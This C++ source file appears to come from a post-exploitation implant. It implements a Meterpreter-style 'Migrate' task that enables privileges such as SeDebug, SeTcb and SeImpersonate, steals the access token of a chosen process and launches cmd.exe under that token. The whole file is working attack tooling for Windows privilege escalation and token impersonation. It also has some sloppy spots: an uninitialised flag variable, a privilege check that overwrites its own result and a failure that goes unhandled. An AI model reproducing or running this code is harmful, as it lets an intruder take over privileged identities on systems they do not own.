#include "core/task.hpp"

namespace Task
{
    // Reference:
    // https://gitbook.seguranca-informatica.pt/privilege-escalation-privesc/process-migration-like-meterpreter
    std::wstring Migrate(const std::wstring& wPid)
    {
        DWORD dwPid = Utils::Convert::WstringToDWORD(wPid, 10);

        BOOL bResult = FALSE;

        // Check if the process has required permissions.
        HANDLE hToken;
        LUID fLuid;
        BOOL bCheckPrivilege = FALSE;

        if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ALL_ACCESS, &hToken))
        {
            return L"Error: Could not open the process token.";
        }

        // const wchar_t* cPrivs[] = {L"SeAssignPrimaryTokenPrivilege", L"SeTcbPrivilege"};
        const wchar_t* cPrivs[] = {SE_ASSIGNPRIMARYTOKEN_NAME, SE_TCB_NAME};

        for (int i = 0; i < 2; i++)
        {
            bCheckPrivilege = System::Priv::CheckPrivilege(hToken, (LPCTSTR)cPrivs[i]);
        }

        if (!bCheckPrivilege)
        {
            // Try to set the necessary privileges.
            HANDLE hCurrentProcessToken;
            OpenProcessToken(
                GetCurrentProcess(),
                TOKEN_ALL_ACCESS,
                &hCurrentProcessToken
            );
            const wchar_t* privs[9] = {
                SE_ASSIGNPRIMARYTOKEN_NAME,     // L"SeAssignPrimaryTokenPrivilege",
                SE_TCB_NAME,                    // L"SeTcbPrivilege",
                SE_CREATE_GLOBAL_NAME,          // L"SeCreateGlobalPrivilege",
                SE_DEBUG_NAME,                  // L"SeDebugPrivilege",
                SE_IMPERSONATE_NAME,            // L"SeImpersonatePrivilege",
                SE_INCREASE_QUOTA_NAME,         // L"SeIncreaseQuotaPrivilege",
                SE_PROF_SINGLE_PROCESS_NAME,    // L"SeProfileSingleProcessPrivilege",
                SE_SECURITY_NAME,               // L"SeSecurityPrivilege",
                SE_SYSTEM_ENVIRONMENT_NAME,     // L"SeSystemEnvironmentPrivilege"
            };
            for (int i = 0; i < 9; i++)
            {
                if (!System::Priv::SetPrivilege(hCurrentProcessToken, privs[i], TRUE))
                {
                    return L"Error: Could not set required privileges to the current process.";
                }
            }
        }

        // Try to migrate to the process.
        // SLEEP(1000);
        HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, dwPid);
        if (!hProcess)
        {
            return L"Error: Could not open the process.";
        }

        HANDLE hNewToken;
        if (!OpenProcessToken(hProcess, TOKEN_ALL_ACCESS, &hNewToken))
        {
            return L"Error: Could open the process token.";
        }
        // SLEEP(500);

        HANDLE hPrimaryToken;
        if (!DuplicateTokenEx(
            hNewToken,
            MAXIMUM_ALLOWED,
            NULL,
            SecurityImpersonation,
            TokenPrimary,
            &hPrimaryToken
        ))
        {
            // Denied to duplicate process tokens.
        }
        // SLEEP(1000);

        // Try to execute new process with duplicated tokens.
        STARTUPINFO si;
        PROCESS_INFORMATION pi;
        DWORD dwFlag;

        ZeroMemory(&si, sizeof(si));
        si.cb = sizeof(si);
        si.lpDesktop = (LPWSTR)L"WinSta0\\Default";
        ZeroMemory(&pi, sizeof(pi));
        
        std::wstring wCmd = L"C:\\Windows\\System32\\cmd.exe";
        // SLEEP(500);
        if (!CreateProcessWithTokenW(
            hPrimaryToken,
            0x00000001,
            NULL,
            (LPWSTR)wCmd.c_str(),
            dwFlag,
            NULL,
            NULL,
            &si,
            &pi
        ))
        {
            return L"Error: Could not create a new process with extracted token.";
        }

        return L"Success: Migrated successfully.";
    }
}
